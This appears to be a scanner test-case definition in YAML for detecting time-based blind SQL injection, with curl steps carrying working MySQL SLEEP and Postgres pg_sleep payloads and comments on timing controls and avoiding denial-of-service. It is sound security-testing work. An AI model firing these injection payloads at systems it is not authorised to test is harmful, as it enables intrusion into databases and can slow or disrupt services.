@@ -1,0 +1,161 @@
+id: WSTG-INPV-05.4
+name: SQL Injection (blind, time-based)
+category: Input Validation
+attack_class: sqli
+severity: high
+references:
+  - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+
+# THE LAST RESORT, AND SEPARATE FROM INPV-05.3 BECAUSE IT IS EXPENSIVE.
+# The boolean case needs the response to CHANGE. When the injected query feeds
+# nothing the page renders — a logging insert, a counter, a lookup whose result
+# is discarded — nothing changes and the only remaining signal is the clock.
+#
+# It is a separate case rather than more steps on INPV-05.3 because the lane
+# budgets targets per case: a case costing ~24 seconds per clean parameter must
+# not be able to consume the budget of one costing 7 fast requests.
+#
+# WHY THERE IS NO `OR` PAYLOAD, MEASURED.
+# `nosuchid' OR SLEEP(1) AND '1'='1` against DVWA took 5025ms — five sleeps for
+# a five-row table, because MySQL evaluates the WHERE clause per row and the
+# left side is false for every one of them. The same payload with the sleep
+# this case actually uses, against a table of any real size, is a denial of
+# service delivered by a scanner. Every payload below is an `AND`, which sleeps
+# only for rows the seed already matched.
+#
+# WHY THE SEED IS `1`, AND WHAT THAT COSTS ON MYSQL. Measured on DVWA:
+# `1' AND SLEEP(4) AND '1'='1` took 4012ms, and the same payload with a seed
+# matching no row took 9ms — MySQL short-circuits the AND per row, so the sleep
+# never runs. The seed has to match something. Postgres does not short-circuit:
+# both seeds took ~6100ms, because the uncorrelated sub-select is evaluated
+# once before the scan. So this case reaches a MySQL target only through a
+# parameter whose valid value is guessable, and a Postgres target regardless.
+#
+# WHY FOUR FAMILIES. The payload has to close whatever the query opened
+# (quoted or unquoted) and name a function the engine actually has. Each form
+# below was run against a real engine — DVWA's MySQL 8.0 and a Postgres 16 —
+# and each was confirmed to sleep in its own context and to error harmlessly in
+# the other: MySQL answers `function sleep(integer) does not exist` to the
+# Postgres form, which costs a request and no delay.
+#
+# WHAT THE CONTROLS CAN AND CANNOT RULE OUT. Each long probe is measured
+# against the two fast baselines AND against the SHORT probe of its own family,
+# so a target that is uniformly slow, or slow for the whole duration of these
+# requests, moves the controls with the step and reports nothing. What one
+# measurement cannot rule out is a single spike landing on the long probe
+# alone. That is why a timing finding is never graded `confirmed` — see the
+# evaluator — and why this case chains to sqlmap, which retries.
+
+target_schema:
+  required: [url, parameter]
+  optional: [cookie, auth_header]
+
+steps:
+  - name: warm_up
+    tool: curl
+    # Discarded. A one-shot flash on the first request of a session would land
+    # on baseline_a alone; measured on DVWA, whose first authenticated response
+    # carries "You have logged in as 'admin'".
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=erlikprobezzz"
+
+  - name: baseline_a
+    tool: curl
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=erlikprobeaaa"
+
+  - name: baseline_b
+    tool: curl
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=erlikprobebbb"
+
+  # ---- MySQL / MariaDB, quoted sink ----
+  - name: mysql_quoted_short
+    tool: curl
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=1' AND SLEEP(1) AND '1'='1"
+
+  - name: mysql_quoted_long
+    tool: curl
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=1' AND SLEEP(5) AND '1'='1"
+    evaluators:
+      - type: timing
+        control: [baseline_a, baseline_b, mysql_quoted_short]
+        delay_ms: 3000
+        emit_finding:
+          vuln_type: SQL Injection (blind, time-based — the parameter reaches a database query)
+          severity: high
+        stop_after: true
+
+  # ---- MySQL / MariaDB, unquoted numeric sink ----
+  - name: mysql_numeric_short
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=1 AND SLEEP(1)"
+
+  - name: mysql_numeric_long
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=1 AND SLEEP(5)"
+    evaluators:
+      - type: timing
+        control: [baseline_a, baseline_b, mysql_numeric_short]
+        delay_ms: 3000
+        emit_finding:
+          vuln_type: SQL Injection (blind, time-based — the parameter reaches a database query)
+          severity: high
+        stop_after: true
+
+  # ---- PostgreSQL, quoted sink ----
+  # pg_sleep returns void, so it cannot sit in a boolean position on its own;
+  # the sub-select is what makes it a comparable value, and it is uncorrelated,
+  # so it runs once for the statement rather than once per row.
+  - name: postgres_quoted_short
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=1' AND (SELECT 1 FROM pg_sleep(1))=1 AND '1'='1"
+
+  - name: postgres_quoted_long
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=1' AND (SELECT 1 FROM pg_sleep(5))=1 AND '1'='1"
+    evaluators:
+      - type: timing
+        control: [baseline_a, baseline_b, postgres_quoted_short]
+        delay_ms: 3000
+        emit_finding:
+          vuln_type: SQL Injection (blind, time-based — the parameter reaches a database query)
+          severity: high
+        stop_after: true
+
+  # ---- PostgreSQL, unquoted numeric sink ----
+  - name: postgres_numeric_short
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=1 AND (SELECT 1 FROM pg_sleep(1))=1"
+
+  - name: postgres_numeric_long
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -G "{{url}}" --data-urlencode "{{parameter}}=1 AND (SELECT 1 FROM pg_sleep(5))=1"
+    evaluators:
+      - type: timing
+        control: [baseline_a, baseline_b, postgres_numeric_short]
+        delay_ms: 3000
+        emit_finding:
+          vuln_type: SQL Injection (blind, time-based — the parameter reaches a database query)
+          severity: high
+        stop_after: true
+
+chain:
+  on_finding:
+    # A timing finding is one measurement. sqlmap retries, and can say which
+    # engine and what it can read.
+    - WSTG-INPV-05
